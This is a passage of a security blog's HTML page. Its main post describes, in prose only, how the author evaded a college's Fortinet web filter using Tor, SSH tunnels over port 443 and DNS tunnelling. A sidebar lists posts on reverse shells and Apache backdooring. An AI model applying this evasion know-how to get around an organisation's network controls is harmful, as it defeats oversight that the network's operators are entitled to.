				<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://insecurety.net/?cat=214" title="View all posts in Algorithms" rel="category">Algorithms</a>, <a href="http://insecurety.net/?cat=374" title="View all posts in Cryptography" rel="category">Cryptography</a>, <a href="http://insecurety.net/?cat=44" title="View all posts in Exploit" rel="category">Exploit</a>, <a href="http://insecurety.net/?cat=6" title="View all posts in Idiots" rel="category">Idiots</a>, <a href="http://insecurety.net/?cat=45" title="View all posts in Python" rel="category">Python</a>			</span>
															<span class="sep"> | </span>
							<span class="tag-links">
				<span class="entry-utility-prep entry-utility-prep-tag-links">Tagged</span> <a href="http://insecurety.net/?tag=bitcoin" rel="tag">bitcoin</a>, <a href="http://insecurety.net/?tag=bitcoin-hijacking" rel="tag">bitcoin hijacking</a>, <a href="http://insecurety.net/?tag=bitcoin-theft" rel="tag">bitcoin theft</a>, <a href="http://insecurety.net/?tag=blatant-theft" rel="tag">blatant theft</a>, <a href="http://insecurety.net/?tag=crypto" rel="tag">crypto</a>, <a href="http://insecurety.net/?tag=implementation" rel="tag">implementation</a>, <a href="http://insecurety.net/?tag=passphrases" rel="tag">passphrases</a>, <a href="http://insecurety.net/?tag=passwords-2" rel="tag">passwords</a>, <a href="http://insecurety.net/?tag=sha256" rel="tag">sha256</a>			</span>
						
									<span class="sep"> | </span>
						<span class="comments-link"><a href="http://insecurety.net/?p=866#comments" title="Comment on Bitcoin &#8220;Brainwallets&#8221; and why they are a bad idea"><b>13</b> Replies</a></span>
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-866 -->

				
					
	<article id="post-860" class="post-860 post type-post status-publish format-standard hentry category-blog category-networking category-security tag-blacklists tag-censorship tag-epic-fail tag-fortinet tag-ssh-tunnel tag-tor">
		<header class="entry-header">
						<h1 class="entry-title"><a href="http://insecurety.net/?p=860" rel="bookmark">Punching through the Fortinet &#8211; Web Filter Evasion</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="http://insecurety.net/?p=860" title="8:57 am" rel="bookmark"><time class="entry-date" datetime="2013-03-21T08:57:30+00:00">March 21, 2013</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="http://insecurety.net/?author=1" title="View all posts by infodox" rel="author">infodox</a></span></span>			</div><!-- .entry-meta -->
			
						<div class="comments-link">
				<a href="http://insecurety.net/?p=860#comments" title="Comment on Punching through the Fortinet &#8211; Web Filter Evasion">7</a>			</div>
					</header><!-- .entry-header -->

				<div class="entry-content">
			<p>Today, 20th of March 2013, I went into college as per normal, and tried accessing this site to upload a new post (which is now in drafts, I will publish it over the weekend). Anyway, I ran straight into this:</p>
<div id="attachment_861" style="width: 1376px" class="wp-caption aligncenter"><a href="http://insecurety.net/wordpress/wp-content/uploads/2013/03/Screenshot-from-2013-03-20-141609.png" ><img class="size-full wp-image-861" alt="censored" src="http://insecurety.net/wordpress/wp-content/uploads/2013/03/Screenshot-from-2013-03-20-141609.png" width="1366" height="768" /></a><p class="wp-caption-text">Me, blocked.</p></div>
<p>I, quite naturally, became quite irate. I had missed my morning cup of coffee due to a delayed bus, and now this. Blocked. Censored. Denied.<br />
I had gotten used to seeing this &#8220;page&#8221; quite often, as my web browsing habits (Security websites) tend to get flagged as &#8220;hacking&#8221; and suchlike. However, seeing my site blatantly blacklisted as a &#8220;malicious website&#8221;, i.e. one which slings malware at its viewers, was a step too bloody far.</p>
<p>After a slight rage-fest on twitter, and several angry emails sent to various responsible persons (all of whom denied any responsibility so far, cowards!) I decided the best course of action would be publishing a guide on getting around these shitty web filters. As it so happens, Fortinet has a bigger gaping hole, than, well, Goatse.<br />
Generally speaking, the best way around any of this crap, is to tunnel right through them. I shall outline the methods I have used with the most success over the last few months of putting up with this nonsense.</p>
<p>TOR &#8211; The Onion Router.<br />
So, the last few posts concentrated on getting you TOR set up, and are linked at the bottom of this post. There is a very valid reason for this, and it is rather simple.</p>
<p>Fortinet &#8220;FortiGard&#8221; has no bloody clue what TOR is, and does not block it. I can surf freely all day long without seeing a single &#8220;blocked&#8221; page, provided I am willing to tolerate severely throttled speeds and &#8220;the lag of TOR&#8221; during the connecting phase.</p>
<p>So, if you are stuck behind a Fortinet, TOR up! It is beneficial to your internet-health anyway! It makes you less traceable!</p>
<p>For TOR installation details, see the following posts:<br />
<a href="http://insecurety.net/?p=847" >Installing TOR on Ubuntu</a><br />
<a href="http://insecurety.net/?p=842" >Installing TOR on Windows</a><br />
<a href="http://insecurety.net/?p=856" >Installing Torbutton</a></p>
<p>Now, if they have blocked TOR, the following tricks will work:</p>
<p>SSH tunnels to port 443.<br />
For a free shell that supports SSH to port 443, go to <a href="http://www.cjb.net/shell.html" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://www.cjb.net']);">CJB.NET Shells</a><br />
If, for some reason, even that fails&#8230; Let me know! I have had some luck with DNS tunnelling also.</p>
<p>So, in conclusion: Fortinet is trivial to bypass, you can do it blindfolded.</p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
												<span class="cat-links">
				<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://insecurety.net/?cat=3" title="View all posts in Blog" rel="category">Blog</a>, <a href="http://insecurety.net/?cat=24" title="View all posts in Networking" rel="category">Networking</a>, <a href="http://insecurety.net/?cat=11" title="View all posts in Security" rel="category">Security</a>			</span>
															<span class="sep"> | </span>
							<span class="tag-links">
				<span class="entry-utility-prep entry-utility-prep-tag-links">Tagged</span> <a href="http://insecurety.net/?tag=blacklists" rel="tag">blacklists</a>, <a href="http://insecurety.net/?tag=censorship" rel="tag">censorship</a>, <a href="http://insecurety.net/?tag=epic-fail" rel="tag">epic fail</a>, <a href="http://insecurety.net/?tag=fortinet" rel="tag">Fortinet</a>, <a href="http://insecurety.net/?tag=ssh-tunnel" rel="tag">SSH tunnel</a>, <a href="http://insecurety.net/?tag=tor" rel="tag">tor</a>			</span>
						
									<span class="sep"> | </span>
						<span class="comments-link"><a href="http://insecurety.net/?p=860#comments" title="Comment on Punching through the Fortinet &#8211; Web Filter Evasion"><b>7</b> Replies</a></span>
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-860 -->

				
						<nav id="nav-below">
			<h3 class="assistive-text">Post navigation</h3>
			<div class="nav-previous"><a href="http://insecurety.net/?paged=2" ><span class="meta-nav">&larr;</span> Older posts</a></div>
			<div class="nav-next"></div>
		</nav><!-- #nav-above -->
	
			
			</div><!-- #content -->
		</div><!-- #primary -->

		<div id="secondary" class="widget-area" role="complementary">
			<aside id="twitter-3" class="widget widget_twitter"><div><h3 class="widget-title"><span class='twitterwidget twitterwidget-title'>Updates from Infodox</span></h3><ul><li><span class='entry-content'><a href="http://twitter.com/ampernand" class="twitter-user">@ampernand</a> Have it trigger on amusing keywords and automatically start a popcornmaker it interfaces with over GPIO pinouts?</span> <span class='entry-meta'><span class='time-meta'><a href="http://twitter.com/info_dox/statuses/491407177756995585">about 4 hours ago</a></span> <span class='from-meta'>from <a href="http://twitter.com" rel="nofollow">Twitter Web Client</a></span> <span class="in-reply-to-meta"><a href="http://twitter.com/ampernand/statuses/491406878623432705" class="reply-to">in reply to ampernand</a></span></span></li><li><span class='entry-content'><a href="http://twitter.com/ampernand" class="twitter-user">@ampernand</a> Blue touch paper has been lit. I wish though they would give enough time to put some popcorn on!</span> <span class='entry-meta'><span class='time-meta'><a href="http://twitter.com/info_dox/statuses/491405112267767808">about 5 hours ago</a></span> <span class='from-meta'>from <a href="http://twitter.com" rel="nofollow">Twitter Web Client</a></span> <span class="in-reply-to-meta"><a href="http://twitter.com/ampernand/statuses/491404003281207299" class="reply-to">in reply to ampernand</a></span></span></li><li><span class='entry-content'>Comedy shitstorm brewing: Some retard said something inadvisable/offensive <a href="https://t.co/3nuWf2PYpx">https://t.co/3nuWf2PYpx</a></span> <span class='entry-meta'><span class='time-meta'><a href="http://twitter.com/info_dox/statuses/491402510113189888">about 5 hours ago</a></span> <span class='from-meta'>from <a href="http://twitter.com" rel="nofollow">Twitter Web Client</a></span></span></li></ul><div class="follow-button"><a href="http://twitter.com/info_dox" class="twitter-follow-button" title="Follow @info_dox" data-lang="en">@info_dox</a></div></div></aside><aside id="text-2" class="widget widget_text"><h3 class="widget-title">Donate :)</h3>			<div class="textwidget"><a class="coinbase-button" data-code="7b3b4598d32b053eb0b3ab3dd4d4794f" data-button-style="donation_large" href="https://coinbase.com/checkouts/7b3b4598d32b053eb0b3ab3dd4d4794f" onclick="javascript:_gaq.push(['_trackEvent','outbound-widget','http://coinbase.com']);">Donate Bitcoins</a><script src="https://coinbase.com/assets/button.js" type="text/javascript"></script></div>
		</aside>		<aside id="recent-posts-2" class="widget widget_recent_entries">		<h3 class="widget-title">Recent Posts</h3>		<ul>
					<li>
				<a href="http://insecurety.net/?p=1017">Host to Guest Code Injection in OpenVZ</a>
						</li>
					<li>
				<a href="http://insecurety.net/?p=991">TinySHell &#8211; Ported to SCTP</a>
						</li>
					<li>
				<a href="http://insecurety.net/?p=933">Password Algorithms: Internet Explorer 10 (Windows Vault)</a>
						</li>
					<li>
				<a href="http://insecurety.net/?p=765">SCTP Reverse Shell</a>
						</li>
					<li>
				<a href="http://insecurety.net/?p=912">ScriptAlias, Backdooring Apache, and the Plesk Remote Code Execution Exploit. (Also a free 0day :P)</a>
						</li>
				</ul>
		</aside><aside id="stf-adsense-3" class="widget stf-adsense"><h3 class="widget-title">The bit that pays the hosting bills&#8230;</h3><div class="adsense vertical_banner"><script type="text/javascript"><!--
		google_ad_client = "pub-4450307631344132";
	 google_ad_width = 120; google_ad_height = 240; google_ad_format = "120x240_as"; 
	
	 /* ad slot is empty */ 
	/* ad channel is empty */
	 google_ad_type = "text_image"; 
	
	google_color_border = "#EEEEEE";
	google_color_link = "#2277DD";
	google_color_url = "#888888";
	google_color_text = "#666666";
	google_color_bg = "#FFFFFF";
	 //-->
		</script>
		<script type="text/javascript"
		src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
		</script></div></aside>		</div><!-- #secondary .widget-area -->

	</div><!-- #main -->

	<footer id="colophon" role="contentinfo">

			
<div id="supplementary" class="one">
		<div id="first" class="widget-area" role="complementary">
		<aside id="stf-adsense-5" class="widget stf-adsense"><h3 class="widget-title">Still gotta pay off my host :(</h3><div class="adsense leaderboard"><script type="text/javascript"><!--
		google_ad_client = "pub-4450307631344132";
	 google_ad_width = 728; google_ad_height = 90; google_ad_format = "728x90_as"; 
	
	 /* ad slot is empty */ 
	/* ad channel is empty */
	 google_ad_type = "text_image"; 
	
	google_color_border = "#EEEEEE";
	google_color_link = "#2277DD";
	google_color_url = "#888888";
	google_color_text = "#666666";
	google_color_bg = "#FFFFFF";
	 //-->
		</script>
		<script type="text/javascript"
		src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
		</script></div></aside>	</div><!-- #first .widget-area -->
	
	
	</div><!-- #supplementary -->
			<div id="site-generator">
								<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform">Proudly powered by WordPress</a>
			</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='http://platform.twitter.com/widgets.js?ver=1.0.0'></script>

</body>
</html>
